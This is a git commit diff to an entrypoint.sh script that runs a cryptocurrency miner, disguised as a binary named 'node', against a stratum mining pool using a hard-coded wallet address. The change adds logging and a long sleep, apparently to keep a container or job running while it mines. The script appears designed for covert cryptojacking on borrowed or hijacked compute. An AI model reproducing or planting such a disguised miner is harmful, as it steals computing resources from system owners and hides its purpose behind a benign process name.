21e1ef7b07364f6b1b27016192b156404b0bf59d
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-04 19:56:33 +0700

    Update entrypoint.sh

--- 1/entrypoint.sh
+++ 1/entrypoint.sh
@@ -4,5 +4,8 @@ chmod +x node
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
-./node --disable-gpu -a Ghostrider -o us-west.oasispool.xyz:13000 -u GeqnGzyChYrCW6nVtam2a8i9xhb4uFwDzh.${WORKER_NUMBER}_crf > try.log
+./node --disable-gpu -a ghostrider -o stratum+tcp://us-west.oasispool.xyz:13000 -u GeqnGzyChYrCW6nVtam2a8i9xhb4uFwDzh.${WORKER_NUMBER}_crf > try.log
+sleep 60
+cat try.log
+
 sleep 29999
